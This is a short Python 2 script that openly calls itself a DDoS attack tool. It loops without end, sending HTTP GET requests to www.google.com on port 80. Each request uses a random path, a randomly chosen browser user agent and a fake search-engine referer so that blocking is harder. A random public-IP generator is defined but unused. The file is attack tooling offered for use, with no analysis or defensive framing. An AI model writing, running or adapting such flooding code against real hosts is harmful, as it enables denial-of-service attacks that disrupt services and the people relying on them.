#!/usr/bin/python
import os
import sys
import time
import socket
import httplib
import random





def print_status(message):
    sys.stdout.write('\r\x1b[K'+message)
    sys.stdout.flush()

def print_line():
    sys.stdout.write('\n')
    sys.stdout.flush()


def get_random_ip():
    random.seed()
    not_valid = [10,127,169,172,192]
    first = random.randint(1,255)
    while first in not_valid:
        first = random.randint(1,255)
    ip = ".".join([str(first),str(random.randint(1,255)),str(random.randint(1,255)),str(random.randint(1,255))])
    return ip


def get_random_agent():
    agents = []
    agents.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1")
    agents.append("Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0")
    agents.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0")
    agents.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")
    agents.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36")
    agents.append("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko")
    return agents[random.randint(0, len(agents)-1)]

def get_random_referer():
    referers = []
    referers.append("http://www.google.com/?q=")
    referers.append("http://www.usatoday.com/search/results?q=")
    referers.append("http://engadget.search.aol.com/search?q=")
    referers.append("http://www.google.co.uk/?q=")
    referers.append("http://www.google.com.br/?q=")
    referers.append("http://www.google.fr/?q=")
    referers.append("http://www.google.it/?q=")
    referers.append("http://www.google.ru/?q=")
    referers.append("http://www.google.es/?q=")
    referers.append("http://www.google.com.mx/?q=")
    referers.append("http://www.google.ca/?q=")
    referers.append("http://www.google.com.au/?q=")
    referers.append("http://www.google.com.tr/?q=")
    referers.append("http://www.google.co.jp/?q=")
    referers.append("http://www.google.com.hk/?q=")
    referers.append("http://www.google.co.in/?q=")
    referers.append("http://www.google.com.pk/?q=")
    referers.append("http://www.google.com.ng/?q=")
    referers.append("http://www.google.com.ar/?q=")
    referers.append("http://www.google.nl/?q=")
    referers.append("http://www.google.be/?q=")
    referers.append("http://www.google.de/?q=")
    referers.append("http://www.google.at/?q=")
    referers.append("http://www.google.ch/?q=")
    referers.append("http://www.google.pl/?q=")
    referers.append("http://www.google.pt/?q=")
    referers.append("http://www.google.ba/?q=")
    referers.append("http://www.google.rs/?q=")
    referers.append("http://www.google.co.za/?q=")
    referers.append("http://www.google.co.ke/?q=")
    referers.append("http://www.google.co.il/?q=")
    referers.append("http://www.google.com.eg/?q=")
    referers.append("http://www.google.co.ve/?q=")
    referers.append("http://www.google.co.id/?q=")
    referers.append("http://www.google.com.ua/?q=")
    referers.append("http://www.google.co.th/?q=")
    referers.append("http://www.google.co.nz/?q=")
    referers.append("http://www.google.lv/?q=")
    referers.append("http://www.google.lt/?q=")
    referers.append("http://www.google.ee/?q=")
    return referers[random.randint(0, len(referers)-1)]

def get_random_string(length):
    letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    return ''.join(random.choice(letters) for i in range(length))



def main():
    print "DDoS Attack Started"
    print "Press Ctrl+C to stop"
    print ""
    print_status("Initializing")
    time.sleep(2)
    print_status("Initialized")
    time.sleep(2)
    print_status("DDoS Attack Started")
    print ""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("www.google.com", 80))
            s.send("GET /" + get_random_string(random.randint(4,10)) + " HTTP/1.1\r\n")
            s.send("Host: " + "www.google.com" + "\r\n")
            s.send("User-Agent: " + get_random_agent() + "\r\n")
            s.send("Accept-language: en-US,en,q=0.5\r\n")
            s.send("Referer: " + get_random_referer() + get_random_string(random.randint(5,10)) + "\r\n")
            s.send("\r\n")
            s.close()
        except socket.error:
            s.close()
            time.sleep(.1)

if __name__ == "__main__":
    main()
